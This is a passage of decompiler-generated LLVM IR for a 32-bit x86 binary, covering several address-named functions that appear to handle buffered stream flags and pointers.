dec_label_pc_8054790:                             ; preds = %dec_label_pc_805475a, %dec_label_pc_8054788
  %v4_8054790 = phi i32 [ %v2_805478e, %dec_label_pc_8054788 ], [ %v4_8054790.pre, %dec_label_pc_805475a ]
  %v5_8054790 = sub i32 %arg3, %v4_8054790
  %v15_8054790 = icmp eq i32 %v5_8054790, 0
  store i1 %v15_8054790, i1* %zf.global-to-local, align 1
  %v0_8054798.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054794

dec_label_pc_8054794:                             ; preds = %dec_label_pc_8054754, %dec_label_pc_8054720, %dec_label_pc_8054790
  %v0_8054798 = phi i32 [ %v0_8054798.pre, %dec_label_pc_8054790 ], [ %v15_8054724, %dec_label_pc_8054720 ], [ %v15_8054724, %dec_label_pc_8054754 ]
  %stack_var_12.0 = phi i32 [ %v5_8054790, %dec_label_pc_8054790 ], [ 0, %dec_label_pc_8054720 ], [ %arg3, %dec_label_pc_8054754 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_8054798 = icmp eq i32 %v0_8054798, -12
  store i1 %v9_8054798, i1* %zf.global-to-local, align 1
  store i32 %v0_8054723, i32* @ebx, align 4
  store i32 %v0_8054721, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_8054785, { 1, 2, 0 }
  uselistorder i32 %v1_8054782, { 1, 0 }
  uselistorder i32 %v1_8054781, { 0, 2, 1 }
  uselistorder i8 %v2_8054773, { 1, 0, 2 }
  uselistorder i32 %v4_8054790.pre, { 2, 0, 1 }
  uselistorder i32 %v2_805476a, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_8054756, { 1, 0 }
  uselistorder i32 %v2_8054754, { 2, 3, 0, 1 }
  uselistorder i32 %v5_8054748, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 4, 3, 5, 1, 6 }
  uselistorder i32 (i32, i32*, i32)* @function_8050f24, { 1, 0 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_8054794, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054790, { 1, 0 }
}

define i32 @function_80547a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80547a0:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80547a0 = load i32, i32* @ebp, align 4
  %v0_80547a1 = load i32, i32* @edi, align 4
  %v0_80547a2 = load i32, i32* @esi, align 4
  %v0_80547a3 = load i32, i32* @ebx, align 4
  store i32 %v0_80547a3, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_80547b3 = add i32 %arg3, 1
  %v2_80547b3 = inttoptr i32 %v1_80547b3 to i8*
  %v3_80547b3 = load i8, i8* %v2_80547b3, align 1
  %v4_80547b3 = and i8 %v3_80547b3, 2
  %v5_80547b3 = icmp eq i8 %v4_80547b3, 0
  %v1_80547b7 = icmp eq i1 %v5_80547b3, false
  br i1 %v1_80547b7, label %dec_label_pc_8054868, label %dec_label_pc_80547bd

dec_label_pc_80547bd:                             ; preds = %dec_label_pc_80547a0
  %v1_80547bd = add i32 %arg3, 4
  %v2_80547bd = inttoptr i32 %v1_80547bd to i32*
  %v3_80547bd = load i32, i32* %v2_80547bd, align 4
  %v13_80547bd = icmp eq i32 %v3_80547bd, -2
  %v1_80547c1 = add i32 %arg3, 16
  %v2_80547c1 = inttoptr i32 %v1_80547c1 to i32*
  %v3_80547c1 = load i32, i32* %v2_80547c1, align 4
  store i32 %v3_80547c1, i32* @edx, align 4
  %v1_80547c4 = add i32 %arg3, 12
  %v2_80547c4 = inttoptr i32 %v1_80547c4 to i32*
  %v3_80547c4 = load i32, i32* %v2_80547c4, align 4
  store i32 %v3_80547c4, i32* %eax.global-to-local, align 4
  %v1_80547c7 = icmp eq i1 %v13_80547bd, false
  %v2_80547e6 = sub i32 %v3_80547c4, %v3_80547c1
  br i1 %v1_80547c7, label %dec_label_pc_80547e6, label %dec_label_pc_80547c9

dec_label_pc_80547c9:                             ; preds = %dec_label_pc_80547bd
  %tmp = icmp uge i32 %v2_80547e6, %arg2
  %v5_80547d0 = select i1 %tmp, i32 %arg2, i32 %v2_80547e6
  store i32 %v5_80547d0, i32* %ebx.global-to-local, align 4
  %v3_80547d6 = inttoptr i32 %v3_80547c1 to i16*
  %v4_80547d6 = call i32 @function_8051e5c(i16* %v3_80547d6, i32 %v5_80547d0, i32 %v3_80547c4)
  store i32 %v4_80547d6, i32* %eax.global-to-local, align 4
  %v0_80547de = load i32, i32* @esi, align 4
  %v1_80547de = add i32 %v0_80547de, 16
  %v2_80547de = inttoptr i32 %v1_80547de to i32*
  %v3_80547de = load i32, i32* %v2_80547de, align 4
  %v4_80547de = load i32, i32* %ebx.global-to-local, align 4
  %v5_80547de = add i32 %v4_80547de, %v3_80547de
  store i32 %v5_80547de, i32* %v2_80547de, align 4
  br label %dec_label_pc_8054880

dec_label_pc_80547e6:                             ; preds = %dec_label_pc_80547bd
  store i32 %v2_80547e6, i32* %eax.global-to-local, align 4
  %v6_80547ea = icmp ult i32 %v2_80547e6, %arg2
  br i1 %v6_80547ea, label %dec_label_pc_805484f, label %dec_label_pc_80547ec

dec_label_pc_80547ec:                             ; preds = %dec_label_pc_80547e6
  %v0_80547ec = load i32, i32* @ecx, align 4
  %v3_80547f0 = inttoptr i32 %v3_80547c1 to i16*
  %v4_80547f0 = call i32 @function_8051e5c(i16* %v3_80547f0, i32 %arg2, i32 %v0_80547ec)
  store i32 %v4_80547f0, i32* %eax.global-to-local, align 4
  %v0_80547f8 = load i32, i32* @esi, align 4
  %v1_80547f8 = add i32 %v0_80547f8, 16
  %v2_80547f8 = inttoptr i32 %v1_80547f8 to i32*
  %v3_80547f8 = load i32, i32* %v2_80547f8, align 4
  %v4_80547f8 = load i32, i32* @edi, align 4
  %v5_80547f8 = add i32 %v4_80547f8, %v3_80547f8
  store i32 %v5_80547f8, i32* %v2_80547f8, align 4
  %v0_80547fb = load i32, i32* @esi, align 4
  %v1_80547fb = add i32 %v0_80547fb, 1
  %v2_80547fb = inttoptr i32 %v1_80547fb to i8*
  %v3_80547fb = load i8, i8* %v2_80547fb, align 1
  %v4_80547fb = urem i8 %v3_80547fb, 2
  %v5_80547fb = icmp eq i8 %v4_80547fb, 0
  br i1 %v5_80547fb, label %dec_label_pc_8054880, label %dec_label_pc_8054801

dec_label_pc_8054801:                             ; preds = %dec_label_pc_80547ec
  %v0_8054801 = load i32, i32* @edx, align 4
  %v0_8054802 = load i32, i32* @edi, align 4
  %v4_8054806 = call i32 @function_8055140(i8 10, i32 %v0_8054802, i32 %v0_8054801)
  store i32 %v4_8054806, i32* %eax.global-to-local, align 4
  %v1_805480e = icmp eq i32 %v4_8054806, 0
  br i1 %v1_805480e, label %dec_label_pc_8054880, label %dec_label_pc_8054812

dec_label_pc_8054812:                             ; preds = %dec_label_pc_8054801
  %v0_8054815 = load i32, i32* @esi, align 4
  %v1_8054816 = call i32 @function_805116c(i32 %v0_8054815)
  store i32 %v1_8054816, i32* %eax.global-to-local, align 4
  %v1_805481e = icmp eq i32 %v1_8054816, 0
  br i1 %v1_805481e, label %dec_label_pc_8054880, label %dec_label_pc_8054822

dec_label_pc_8054822:                             ; preds = %dec_label_pc_8054812
  %v0_8054822 = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_8054822, %v1_8054816
  %v5_8054826 = select i1 %tmp20, i32 %v0_8054822, i32 %v1_8054816
  store i32 %v5_8054826, i32* %ebx.global-to-local, align 4
  %v2_805482b = sub i32 %v0_8054822, %v5_8054826
  store i32 %v2_805482b, i32* %eax.global-to-local, align 4
  %v0_805482d = load i32, i32* @ebp, align 4
  %v2_805482d = add i32 %v0_805482d, %v2_805482b
  store i32 %v2_805482d, i32* %ebp.global-to-local, align 4
  %v4_8054834 = call i32 @function_80550d0(i8* inttoptr (i32 10 to i8*), i32 %v5_8054826, i32 %v2_805482b)
  store i32 %v4_8054834, i32* %eax.global-to-local, align 4
  %v1_805483c = icmp eq i32 %v4_8054834, 0
  store i32 %v4_8054834, i32* @edx, align 4
  br i1 %v1_805483c, label %dec_label_pc_8054880, label %dec_label_pc_8054842

dec_label_pc_8054842:                             ; preds = %dec_label_pc_8054822
  %v0_8054842 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054842 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054842 = sub i32 %v0_8054842, %v4_8054834
  %v2_8054846 = add i32 %v2_8054842, %v1_8054842
  store i32 %v2_8054846, i32* %eax.global-to-local, align 4
  %v0_8054848 = load i32, i32* @esi, align 4
  %v1_8054848 = add i32 %v0_8054848, 16
  %v2_8054848 = inttoptr i32 %v1_8054848 to i32*
  %v3_8054848 = load i32, i32* %v2_8054848, align 4
  %v5_8054848 = sub i32 %v3_8054848, %v2_8054846
  store i32 %v5_8054848, i32* %v2_8054848, align 4
  %v0_805484b = load i32, i32* @edi, align 4
  %v1_805484b = load i32, i32* %eax.global-to-local, align 4
  %v2_805484b = sub i32 %v0_805484b, %v1_805484b
  store i32 %v2_805484b, i32* @edi, align 4
  br label %dec_label_pc_8054880

dec_label_pc_805484f:                             ; preds = %dec_label_pc_80547e6
  %v2_805484f = add i32 %arg3, 8
  %v3_805484f = inttoptr i32 %v2_805484f to i32*
  %v4_805484f = load i32, i32* %v3_805484f, align 4
  %v15_805484f = icmp eq i32 %v3_80547c1, %v4_805484f
  br i1 %v15_805484f, label %dec_label_pc_8054868, label %dec_label_pc_8054854

dec_label_pc_8054854:                             ; preds = %dec_label_pc_805484f
  %v1_8054858 = call i32 @function_805116c(i32 %arg3)
  store i32 %v1_8054858, i32* %eax.global-to-local, align 4
  %v1_8054860 = icmp eq i32 %v1_8054858, 0
  br i1 %v1_8054860, label %dec_label_pc_8054854.dec_label_pc_8054868_crit_edge, label %dec_label_pc_8054864

dec_label_pc_8054854.dec_label_pc_8054868_crit_edge: ; preds = %dec_label_pc_8054854
  %v0_8054868.pre = load i32, i32* @edi, align 4
  %v0_8054870.pre = load i32, i32* @esi, align 4
  %v2_8054877.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8054868

dec_label_pc_8054864:                             ; preds = %dec_label_pc_8054854
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8054880

dec_label_pc_8054868:                             ; preds = %dec_label_pc_8054854.dec_label_pc_8054868_crit_edge, %dec_label_pc_805484f, %dec_label_pc_80547a0
  %v2_8054877 = phi i32 [ %v2_8054877.pre, %dec_label_pc_8054854.dec_label_pc_8054868_crit_edge ], [ %v0_80547a3, %dec_label_pc_805484f ], [ %v0_80547a3, %dec_label_pc_80547a0 ]
  %v0_8054870 = phi i32 [ %v0_8054870.pre, %dec_label_pc_8054854.dec_label_pc_8054868_crit_edge ], [ %arg3, %dec_label_pc_805484f ], [ %arg3, %dec_label_pc_80547a0 ]
  %v0_8054868 = phi i32 [ %v0_8054868.pre, %dec_label_pc_8054854.dec_label_pc_8054868_crit_edge ], [ %arg2, %dec_label_pc_805484f ], [ %arg2, %dec_label_pc_80547a0 ]
  store i32 %v2_8054877, i32* @ebx, align 4
  store i32 %v0_80547a1, i32* @edi, align 4
  %v4_805487b = inttoptr i32 %v0_8054870 to i16*
  %v5_805487b = call i32 @function_8054720(i16* %v4_805487b, i32 %v0_8054868, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805487b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054880

dec_label_pc_8054880:                             ; preds = %dec_label_pc_8054822, %dec_label_pc_8054812, %dec_label_pc_8054801, %dec_label_pc_80547ec, %dec_label_pc_8054864, %dec_label_pc_8054842, %dec_label_pc_80547c9, %dec_label_pc_8054868
  %v0_8054883 = load i32, i32* @edi, align 4
  store i32 %v0_8054883, i32* %eax.global-to-local, align 4
  %v2_8054885 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8054885, i32* @ebx, align 4
  store i32 %v0_80547a2, i32* @esi, align 4
  store i32 %v0_80547a1, i32* @edi, align 4
  store i32 %v0_80547a0, i32* @ebp, align 4
  ret i32 %v0_8054883

; uselistorder directives
  uselistorder i32 %v2_8054846, { 1, 0 }
  uselistorder i32 %v0_8054822, { 2, 1, 0 }
  uselistorder i32 %v1_8054816, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80547e6, { 2, 3, 1, 0 }
  uselistorder i32 %v3_80547c1, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_80547a1, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_8054880, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @function_805488c(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805488c:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805488c = load i32, i32* @ebx, align 4
  %v4_8054890 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8054890, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8054898 = load i16, i16* %arg1, align 2
  %v3_8054898 = zext i16 %v2_8054898 to i32
  store i32 %v3_8054898, i32* %eax.global-to-local, align 4
  %v2_805489b = and i32 %v3_8054898, %arg2
  %v3_805489b = icmp eq i32 %v2_805489b, 0
  %v1_805489d = icmp eq i1 %v3_805489b, false
  br i1 %v1_805489d, label %dec_label_pc_80548ab, label %dec_label_pc_805489f

dec_label_pc_805489f:                             ; preds = %dec_label_pc_805488c
  %v1_805489f = and i32 %v3_8054898, 2176
  %v2_805489f = icmp eq i32 %v1_805489f, 0
  %v1_80548a4 = icmp eq i1 %v2_805489f, false
  br i1 %v1_80548a4, label %dec_label_pc_80548b3, label %dec_label_pc_80548a6

dec_label_pc_80548a6:                             ; preds = %dec_label_pc_805489f
  %v2_80548a6 = or i32 %v3_8054898, %arg2
  store i32 %v2_80548a6, i32* %eax.global-to-local, align 4
  %v1_80548a8 = trunc i32 %v2_80548a6 to i16
  store i16 %v1_80548a8, i16* %arg1, align 2
  %v0_80548ab.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80548ab

dec_label_pc_80548ab:                             ; preds = %dec_label_pc_805488c, %dec_label_pc_80548a6
  %v0_80548f4 = phi i32 [ %v4_8054890, %dec_label_pc_805488c ], [ %v0_80548ab.pre, %dec_label_pc_80548a6 ]
  %v1_80548ab = inttoptr i32 %v0_80548f4 to i16*
  %v2_80548ab = load i16, i16* %v1_80548ab, align 2
  %v3_80548ab = zext i16 %v2_80548ab to i32
  store i32 %v3_80548ab, i32* %edx.global-to-local, align 4
  %v2_80548ae = and i16 %v2_80548ab, 32
  %v3_80548ae = icmp eq i16 %v2_80548ae, 0
  br i1 %v3_80548ae, label %dec_label_pc_80548cb, label %dec_label_pc_80548b3

dec_label_pc_80548b3:                             ; preds = %dec_label_pc_80548ab, %dec_label_pc_805489f
  %v1_80548b3 = call i32 @function_8050f90(i32 %v0_805488c)
  store i32 %v1_80548b3, i32* %eax.global-to-local, align 4
  %v1_80548b8 = inttoptr i32 %v1_80548b3 to i32*
  store i32 9, i32* %v1_80548b8, align 4
  br label %dec_label_pc_80548be

dec_label_pc_80548be:                             ; preds = %dec_label_pc_80548e2, %dec_label_pc_80548b3
  %v0_80548be = load i32, i32* @ebx, align 4
  %v1_80548be = inttoptr i32 %v0_80548be to i32*
  %v2_80548be = load i32, i32* %v1_80548be, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_80548c3 = or i32 %v2_80548be, 8
  store i32 %v1_80548c3, i32* %eax.global-to-local, align 4
  %v1_80548c6 = trunc i32 %v1_80548c3 to i16
  %v3_80548c6 = inttoptr i32 %v0_80548be to i16*
  store i16 %v1_80548c6, i16* %v3_80548c6, align 2
  br label %dec_label_pc_805492d

dec_label_pc_80548cb:                             ; preds = %dec_label_pc_80548ab
  %v2_80548cb = urem i16 %v2_80548ab, 4
  %v3_80548cb = icmp eq i16 %v2_80548cb, 0
  br i1 %v3_80548cb, label %dec_label_pc_8054915, label %dec_label_pc_80548d0

dec_label_pc_80548d0:                             ; preds = %dec_label_pc_80548cb
  %v2_80548d0 = and i32 %v3_80548ab, 4
  %v3_80548d0 = icmp eq i32 %v2_80548d0, 0
  %v1_80548d3 = icmp eq i1 %v3_80548d0, false
  br i1 %v1_80548d3, label %dec_label_pc_8054901, label %dec_label_pc_80548d5

dec_label_pc_80548d5:                             ; preds = %dec_label_pc_80548d0
  %v1_80548d5 = add i32 %v0_80548f4, 20
  %v2_80548d5 = inttoptr i32 %v1_80548d5 to i32*
  %v3_80548d5 = load i32, i32* %v2_80548d5, align 4
  store i32 %v3_80548d5, i32* %eax.global-to-local, align 4
  %v2_80548d8 = add i32 %v0_80548f4, 16
  %v3_80548d8 = inttoptr i32 %v2_80548d8 to i32*
  %v4_80548d8 = load i32, i32* %v3_80548d8, align 4
  %v15_80548d8 = icmp eq i32 %v3_80548d5, %v4_80548d8
  %v1_80548db = icmp eq i1 %v15_80548d8, false
  br i1 %v1_80548db, label %dec_label_pc_80548e2, label %dec_label_pc_80548dd

dec_label_pc_80548dd:                             ; preds = %dec_label_pc_80548d5
  %v2_80548dd = and i32 %v3_80548ab, 2
  %v3_80548dd = icmp eq i32 %v2_80548dd, 0
  br i1 %v3_80548dd, label %dec_label_pc_8054901, label %dec_label_pc_80548e2

dec_label_pc_80548e2:                             ; preds = %dec_label_pc_80548dd, %dec_label_pc_80548d5
  %v1_80548e2 = and i32 %v3_80548ab, 1024
  store i32 %v1_80548e2, i32* %edx.global-to-local, align 4
  %tmp16 = udiv i32 %v1_80548e2, 1024
  %tmp17 = xor i32 %tmp16, 3
  store i32 %tmp17, i32* %eax.global-to-local, align 4
  %v5_80548f5 = call i32 @function_8055e90(i32 %v0_80548f4, i32 0, i32 %tmp17, i32 %v1_80548e2)
  store i32 %v5_80548f5, i32* %eax.global-to-local, align 4
  %v1_80548fd = icmp eq i32 %v5_80548f5, 0
  %v1_80548ff = icmp eq i1 %v1_80548fd, false
  br i1 %v1_80548ff, label %dec_label_pc_80548be, label %dec_label_pc_80548e2.dec_label_pc_8054901_crit_edge

dec_label_pc_80548e2.dec_label_pc_8054901_crit_edge: ; preds = %dec_label_pc_80548e2
  %v0_8054901.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054901

dec_label_pc_8054901:                             ; preds = %dec_label_pc_80548e2.dec_label_pc_8054901_crit_edge, %dec_label_pc_80548dd, %dec_label_pc_80548d0
  %v2_8054906 = phi i32 [ %v0_8054901.pre, %dec_label_pc_80548e2.dec_label_pc_8054901_crit_edge ], [ %v0_80548f4, %dec_label_pc_80548dd ], [ %v0_80548f4, %dec_label_pc_80548d0 ]
  %v1_8054901 = inttoptr i32 %v2_8054906 to i32*
  %v2_8054901 = load i32, i32* %v1_8054901, align 4
  %v1_8054903 = and i32 %v2_8054901, -4
  store i32 %v1_8054903, i32* %eax.global-to-local, align 4
  %v1_8054906 = trunc i32 %v1_8054903 to i16
  %v3_8054906 = inttoptr i32 %v2_8054906 to i16*
  store i16 %v1_8054906, i16* %v3_8054906, align 2
  %v0_8054909 = load i32, i32* @ebx, align 4
  %v1_8054909 = add i32 %v0_8054909, 8
  %v2_8054909 = inttoptr i32 %v1_8054909 to i32*
  %v3_8054909 = load i32, i32* %v2_8054909, align 4
  store i32 %v3_8054909, i32* %eax.global-to-local, align 4
  %v2_805490c = add i32 %v0_8054909, 24
  %v3_805490c = inttoptr i32 %v2_805490c to i32*
  store i32 %v3_8054909, i32* %v3_805490c, align 4
  %v0_805490f = load i32, i32* %eax.global-to-local, align 4
  %v1_805490f = load i32, i32* @ebx, align 4
  %v2_805490f = add i32 %v1_805490f, 16
  %v3_805490f = inttoptr i32 %v2_805490f to i32*
  store i32 %v0_805490f, i32* %v3_805490f, align 4
  %v0_8054912 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054912 = load i32, i32* @ebx, align 4
  %v2_8054912 = add i32 %v1_8054912, 20
  %v3_8054912 = inttoptr i32 %v2_8054912 to i32*
  store i32 %v0_8054912, i32* %v3_8054912, align 4
  %v0_8054915.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054915

dec_label_pc_8054915:                             ; preds = %dec_label_pc_80548cb, %dec_label_pc_8054901
  %v2_805491c = phi i32 [ %v0_80548f4, %dec_label_pc_80548cb ], [ %v0_8054915.pre, %dec_label_pc_8054901 ]
  %v1_8054915 = inttoptr i32 %v2_805491c to i32*
  %v2_8054915 = load i32, i32* %v1_8054915, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8054919 = or i32 %v2_8054915, 64
  store i32 %v1_8054919, i32* %eax.global-to-local, align 4
  %v1_805491c = trunc i32 %v1_8054919 to i16
  %v3_805491c = inttoptr i32 %v2_805491c to i16*
  store i16 %v1_805491c, i16* %v3_805491c, align 2
  %v0_805491f = load i32, i32* %eax.global-to-local, align 4
  %v1_805491f = urem i32 %v0_805491f, 65536
  store i32 %v1_805491f, i32* %eax.global-to-local, align 4
  %v3_8054922 = and i32 %v0_805491f, 2816
  %v4_8054922 = icmp eq i32 %v3_8054922, 0
  %v1_8054925 = icmp eq i1 %v4_8054922, false
  br i1 %v1_8054925, label %dec_label_pc_805492d, label %dec_label_pc_8054927

dec_label_pc_8054927:                             ; preds = %dec_label_pc_8054915
  %v0_8054927 = load i32, i32* @ebx, align 4
  %v1_8054927 = add i32 %v0_8054927, 12
  %v2_8054927 = inttoptr i32 %v1_8054927 to i32*
  %v3_8054927 = load i32, i32* %v2_8054927, align 4
  store i32 %v3_8054927, i32* %eax.global-to-local, align 4
  %v2_805492a = add i32 %v0_8054927, 28
  %v3_805492a = inttoptr i32 %v2_805492a to i32*
  store i32 %v3_8054927, i32* %v3_805492a, align 4
  br label %dec_label_pc_805492d

dec_label_pc_805492d:                             ; preds = %dec_label_pc_8054915, %dec_label_pc_80548be, %dec_label_pc_8054927
  %v0_805492d = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805492d, i32* %eax.global-to-local, align 4
  %v2_805492f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805492f, i32* %edx.global-to-local, align 4
  store i32 %v0_805488c, i32* @ebx, align 4
  ret i32 %v0_805492d

; uselistorder directives
  uselistorder i32 %v0_805491f, { 1, 0 }
  uselistorder i32 %v1_80548e2, { 1, 0, 2 }
  uselistorder i32 %v0_80548f4, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_8054898, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805488c, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805492d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054915, { 1, 0 }
  uselistorder label %dec_label_pc_80548ab, { 1, 0 }
}

define i32 @function_8054934() local_unnamed_addr {
dec_label_pc_8054934:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v5_8054934 = icmp slt i32 %tmp4, 0
  %v3_8054965 = and i32 %tmp3, 2048
  %v4_8054965 = icmp eq i32 %v3_8054965, 0
  br i1 %v5_8054934, label %dec_label_pc_8054965, label %dec_label_pc_8054943

dec_label_pc_8054943:                             ; preds = %dec_label_pc_8054934
  %v1_8054946 = icmp eq i1 %v4_8054965, false
  br i1 %v1_8054946, label %dec_label_pc_805496a, label %dec_label_pc_8054948

dec_label_pc_8054948:                             ; preds = %dec_label_pc_8054943
  %v6_8054948 = icmp eq i32 %tmp3, 256
  %v1_805494e = inttoptr i32 %tmp to i32*
  %v2_805494e = load i32, i32* %v1_805494e, align 4
  %v1_8054950 = icmp eq i1 %v6_8054948, false
  br i1 %v1_8054950, label %dec_label_pc_8054957, label %dec_label_pc_8054952

dec_label_pc_8054952:                             ; preds = %dec_label_pc_8054948
  %v1_8054952 = urem i32 %v2_805494e, 256
  br label %dec_label_pc_8054962

dec_label_pc_8054957:                             ; preds = %dec_label_pc_8054948
  %v6_8054957 = icmp eq i32 %tmp3, 512
  %v1_805495d = icmp eq i1 %v6_8054957, false
  br i1 %v1_805495d, label %dec_label_pc_8054962, label %dec_label_pc_805495f

dec_label_pc_805495f:                             ; preds = %dec_label_pc_8054957
  %v1_805495f = urem i32 %v2_805494e, 65536
  br label %dec_label_pc_8054962

dec_label_pc_8054962:                             ; preds = %dec_label_pc_8054957, %dec_label_pc_8054952, %dec_label_pc_805495f
  %v0_8054964 = phi i32 [ %v2_805494e, %dec_label_pc_8054957 ], [ %v1_8054952, %dec_label_pc_8054952 ], [ %v1_805495f, %dec_label_pc_805495f ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8054964

dec_label_pc_8054965:                             ; preds = %dec_label_pc_8054934
  br i1 %v4_8054965, label %dec_label_pc_8054970, label %dec_label_pc_805496a

dec_label_pc_805496a:                             ; preds = %dec_label_pc_8054965, %dec_label_pc_8054943
  %v1_805496a = add i32 %tmp, 4
  %v2_805496a = inttoptr i32 %v1_805496a to i32*
  %v3_805496a = load i32, i32* %v2_805496a, align 4
  store i32 %v3_805496a, i32* @edx, align 4
  %v1_805496d = inttoptr i32 %tmp to i32*
  %v2_805496d = load i32, i32* %v1_805496d, align 4
  ret i32 %v2_805496d

dec_label_pc_8054970:                             ; preds = %dec_label_pc_8054965
  %v6_8054970 = icmp eq i32 %tmp3, 256
  %v1_8054976 = inttoptr i32 %tmp to i32*
  %v2_8054976 = load i32, i32* %v1_8054976, align 4
  %v1_8054978 = icmp eq i1 %v6_8054970, false
  br i1 %v1_8054978, label %dec_label_pc_805497f, label %dec_label_pc_805497a

dec_label_pc_805497a:                             ; preds = %dec_label_pc_8054970
  %v1_805497a = mul i32 %v2_8054976, 16777216
  %v2_805497a = sdiv i32 %v1_805497a, 16777216
  br label %dec_label_pc_8054988

dec_label_pc_805497f:                             ; preds = %dec_label_pc_8054970
  %v6_805497f = icmp eq i32 %tmp3, 512
  %v1_8054985 = icmp eq i1 %v6_805497f, false
  br i1 %v1_8054985, label %dec_label_pc_8054988, label %dec_label_pc_8054987

dec_label_pc_8054987:                             ; preds = %dec_label_pc_805497f
  %v1_8054987 = mul i32 %v2_8054976, 65536
  %v2_8054987 = sdiv i32 %v1_8054987, 65536
  br label %dec_label_pc_8054988

dec_label_pc_8054988:                             ; preds = %dec_label_pc_805497f, %dec_label_pc_805497a, %dec_label_pc_8054987
  %v0_8054988 = phi i32 [ %v2_8054976, %dec_label_pc_805497f ], [ %v2_805497a, %dec_label_pc_805497a ], [ %v2_8054987, %dec_label_pc_8054987 ]
  %v1_8054988 = ashr i32 %v0_8054988, 31
  store i32 %v1_8054988, i32* @edx, align 4
  ret i32 %v0_8054988

; uselistorder directives
  uselistorder i32 %v0_8054988, { 1, 0 }
  uselistorder i32 %v2_8054976, { 2, 0, 1 }
  uselistorder i32 %v2_805494e, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8054988, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054962, { 2, 0, 1 }
}

define i32 @function_805498c() local_unnamed_addr {
dec_label_pc_805498c:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_6()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805498c = load i32, i32* @ebx, align 4
  store i32 %v0_805498c, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8054991 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8054991, i32* %ebx.global-to-local, align 4
  %v4_8054995 = trunc i32 %tmp4 to i16
  %v6_805499d = icmp eq i32 %tmp6, 256
  %v1_80549a3 = icmp eq i1 %v6_805499d, false
  br i1 %v1_80549a3, label %dec_label_pc_80549a9, label %dec_label_pc_80549a5

dec_label_pc_80549a5:                             ; preds = %dec_label_pc_805498c
  %v2_80549a5 = trunc i32 %tmp4 to i8
  %v4_80549a5 = bitcast i16* %tmp5 to i8*
  store i8 %v2_80549a5, i8* %v4_80549a5, align 1
  br label %dec_label_pc_80549c7

dec_label_pc_80549a9:                             ; preds = %dec_label_pc_805498c
  %v6_80549a9 = icmp eq i32 %tmp6, 2048
  %v1_80549af = icmp eq i1 %v6_80549a9, false
  br i1 %v1_80549af, label %dec_label_pc_80549b8, label %dec_label_pc_80549b1

dec_label_pc_80549b1:                             ; preds = %dec_label_pc_80549a9
  %sext2 = mul i32 %tmp4, 65536
  %v1_80549b1 = sdiv i32 %sext2, 65536
  %v3_80549b1 = bitcast i16* %tmp5 to i32*
